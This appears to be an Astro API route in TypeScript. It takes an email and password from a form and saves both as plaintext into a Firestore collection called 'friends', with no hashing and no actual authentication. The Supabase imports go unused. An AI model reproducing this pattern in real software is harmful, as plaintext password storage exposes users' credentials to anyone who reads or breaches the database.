import { supabase } from "@lib/supabase";
import type { Provider } from "@supabase/supabase-js";
import type { APIRoute } from "astro";
import { getFirestore } from "firebase-admin/firestore";
import { app } from "../../../firebase/server";

export const POST: APIRoute = async ({ request, cookies, redirect }) => {
  const formData = await request.formData();
  const email = formData.get("email")?.toString();
  const password = formData.get("password")?.toString();

  if (!email || !password) {
    return new Response("Email and password are required", { status: 400 });
  }

  try {
    const db = getFirestore(app);
    const friendsRef = db.collection("friends");
    await friendsRef.add({
      email,
      password
    });
  } catch (error) {
    return new Response("Something went wrong", {
      status: 500,
    });
  }

  return redirect("/");
};